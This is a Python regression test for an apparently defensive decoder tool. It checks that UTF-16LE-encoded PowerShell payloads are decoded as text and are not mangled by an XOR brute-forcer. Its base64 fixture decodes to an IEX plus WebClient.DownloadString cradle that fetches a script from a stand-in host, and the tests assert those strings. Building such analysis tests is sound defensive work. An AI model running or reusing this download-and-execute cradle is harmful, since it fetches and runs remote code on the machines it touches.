"""Regression: PowerShell -EncodedCommand decoding must NEVER fall
through to xor-brute.

Adversarial report (2026-07-24): a UTF-16LE-encoded PowerShell payload
(`powershell.exe -enc <base64>`) was being clobbered by xor-brute
because the base64-decoded buffer had high entropy + repeating-NUL
bytes. Fix: the xor-brute detector explicitly refuses buffers that
match the UTF-16LE ASCII fingerprint (NUL every other byte + printable
ASCII at even positions).

This test asserts the guard stays in place.
"""
from __future__ import annotations

import base64
import sys

import pytest

sys.path.insert(0, "/app/backend")

from decoders.xor_brute import XorBruteDecoder
from decoders.utf16 import Utf16Decoder


class _FP:
    entropy = 4.5
    printable_ratio = 0.5
    english_density = 0.0
    is_binary = True


class _Ctx:
    pass


# Canonical UTF-16LE-encoded PowerShell EncodedCommand payload.
_PS_UTF16LE_B64 = (
    "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4A"
    "ZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQA"
    "cgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwB1AHAAZABhAHQAZQAuAGwAbwBjAGEA"
    "bAAvAHAALgBwAHMAMQAnACkA"
)


def _decoded_as_latin1() -> str:
    return base64.b64decode(_PS_UTF16LE_B64).decode("latin-1", errors="replace")


def test_xor_brute_refuses_utf16le_powershell_payload():
    """xor-brute MUST return confidence=0 for a base64-decoded PowerShell
    UTF-16LE payload — otherwise it clobbers a real IEX + DownloadString
    into unreadable garbage."""
    xor = XorBruteDecoder()
    latin1 = _decoded_as_latin1()
    d = xor.detect(latin1, _FP(), _Ctx())
    assert d.confidence == 0.0, (
        f"xor-brute should refuse UTF-16LE PowerShell payloads; got conf={d.confidence} · {d.why}"
    )
    assert "UTF-16LE" in d.why, f"guard reason must mention UTF-16LE; got: {d.why}"


def test_utf16_decoder_wins_the_race_and_recovers_the_command():
    """After the xor-brute guard, utf16-decode wins the decoder race and
    reconstructs the original PowerShell IEX + DownloadString call."""
    xor = XorBruteDecoder()
    u16 = Utf16Decoder()
    latin1 = _decoded_as_latin1()
    d_x = xor.detect(latin1, _FP(), _Ctx())
    d_u = u16.detect(latin1, _FP(), _Ctx())
    assert d_u.confidence > d_x.confidence, (
        f"utf16-decode must outrank xor-brute · utf16={d_u.confidence} vs xor={d_x.confidence}"
    )
    out = u16.decode(latin1, d_u.args or {}, _Ctx())
    text = out.output
    assert "New-Object" in text
    assert "System.Net.WebClient" in text
    assert "DownloadString" in text
    assert "http://update.local/p.ps1" in text
